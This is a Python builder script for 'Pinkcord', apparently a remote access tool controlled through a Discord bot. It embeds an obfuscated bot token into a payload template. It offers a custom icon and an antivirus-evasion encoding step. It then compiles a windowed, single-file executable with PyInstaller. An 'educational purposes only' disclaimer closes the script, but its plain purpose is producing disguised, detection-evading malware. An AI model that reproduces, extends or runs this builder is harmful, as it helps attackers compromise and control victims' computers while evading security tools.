import subprocess
import sys
import codecs
import base64
import platform
import os

TOKEN_FILE = 'template/pinkcord.py'
TO_BYPASS_FILE = 'to_bypass.txt'
BYPASS_FILE = 'template/pinkcord_bypass.py'
DIST_FOLDER = 'dist'
COLOR_RESET = "\033[0m"
GREEN_COLOR = "\033[32m"
YELLOW_COLOR = "\033[33m"
RED_COLOR = "\033[31m"

asciart = "\033[95m" + '''
  _____ _____ _   _ _  _______ ____  _____  _____  
 |  __ \_   _| \ | | |/ / ____/ __ \|  __ \|  __ \ 
 | |__) || | |  \| | ' / |   | |  | | |__) | |  | |
 |  ___/ | | | . ` |  <| |   | |  | |  _  /| |  | |
 | |    _| |_| |\  | . \ |___| |__| | | \ \| |__| |
 |_|   |_____|_| \_|_|\_\_____\____/|_|  \_\_____/ 

https://github.com/xanonDev/pinkcord
[!] some functions may not work on linux, so I recommend using windows to run this script
''' + COLOR_RESET


def clear_console():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')


clear_console()
print(asciart)
print(YELLOW_COLOR + "Installing required libraries..." + COLOR_RESET)
subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
clear_console()
print(asciart)
print(GREEN_COLOR + "Libraries installed[*]" + COLOR_RESET)
token = input("Enter your Discord bot token: ")
print(YELLOW_COLOR + "Encoding token..." + COLOR_RESET)
token = token.encode('utf-8')
token = base64.b64encode(token)
token = base64.b32encode(token)
token = token.decode('utf-8')
token = codecs.encode(token, 'rot13')
print(GREEN_COLOR + "Token encoded[*]" + COLOR_RESET)
print(YELLOW_COLOR + 'Replacing the token in the pinkcord.py file....' + COLOR_RESET)
with open(TOKEN_FILE, 'r') as sc:
    content = sc.read()
    content = content.replace("<TOKEN>", token)
with open("pinkcord.py", 'w') as sc:
    sc.write(content)
clear_console()
print(asciart)
print('Do you want to test Pinkcord by running it?')
print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
print(RED_COLOR + '2. No' + COLOR_RESET)
answer = input("Choice: ")
clear_console()
print(asciart)
if answer == "1":
    if platform.system() == 'Windows':
        subprocess.Popen(['start', 'cmd', '/k', 'py', 'pinkcord.py'], shell=True)
    else:
        subprocess.Popen(['xterm', '-e', 'python', 'pinkcord.py'])
    print(YELLOW_COLOR + 'Send !h to your Discord bot. If it responds, it means it\'s working')
    print('If it doesn\'t respond, press ENTER in the new window and try again' + COLOR_RESET)
    input(GREEN_COLOR + 'Press ENTER when you finish testing' + COLOR_RESET)
clear_console()
print(asciart)
print("do you want to set a custom icon for your Pinkcord?")
print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
print(RED_COLOR + '2. No' + COLOR_RESET)
answer = input("Choice: ")
if answer == "1":
    icon = input("enter the path to your .ico file: ")
clear_console()
print(asciart)
print('Do you want to encode Pinkcord to make it undetectable by antivirus software and harder to decompile?')
print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
print(RED_COLOR + '2. No' + COLOR_RESET)
answer = input("Choice: ")
if answer == "1":
    print(YELLOW_COLOR + 'Encoding Pinkcord...' + COLOR_RESET)
    with open("pinkcord.py", 'r') as sourcecode:
        with open(TO_BYPASS_FILE, 'w') as codefile:
            codefile.write(sourcecode.read())
            subprocess.check_call([sys.executable, 'bypasser.py'])
            codefile.close()
            sourcecode.close()
    print(YELLOW_COLOR + "Creating a bypass script..." + COLOR_RESET)
    with open(TO_BYPASS_FILE, 'r') as codefile:
        encoded_code = codefile.read()
    with open(BYPASS_FILE, 'r') as bypass:
        content = bypass.read()
        content = content.replace("<BYPASS>", encoded_code)
    with open("pinkcord_bypass.py", 'w') as bypass:
        bypass.write(content)
    clear_console()
    print(asciart)
    import PyInstaller.__main__
    print(GREEN_COLOR + "Generating exe file...")
    if "icon" in globals():
        params = [
            '--onefile',
            '--windowed',
            f'--icon={icon}',
            "pinkcord_bypass.py"
        ]
    else: 
        params = [
            '--onefile',
            '--windowed',
            "pinkcord_bypass.py"
        ]
    PyInstaller.__main__.run(params)
    clear_console()
    print(asciart)
    print(GREEN_COLOR + f"[*] pinkcord_bypass.exe generated in the {DIST_FOLDER} folder" + COLOR_RESET)
    print("\033[31m" + "[!] Remember, this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)
else:
    clear_console()
    print(asciart)
    import PyInstaller.__main__
    print(GREEN_COLOR + "Generating exe file...")
    if "icon" in globals():
        params = [
            '--onefile',
            '--windowed',
            f'--icon={icon}',
            "pinkcord.py"
        ]
    else:
        params = [
            '--onefile',
            '--windowed',
            "pinkcord.py"
        ]
    PyInstaller.__main__.run(params)
    clear_console()
    print(asciart)
    print(GREEN_COLOR + f"[*] pinkcord.exe generated in the {DIST_FOLDER} folder" + COLOR_RESET)
    print("\033[31m" + "[!] Remember this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)
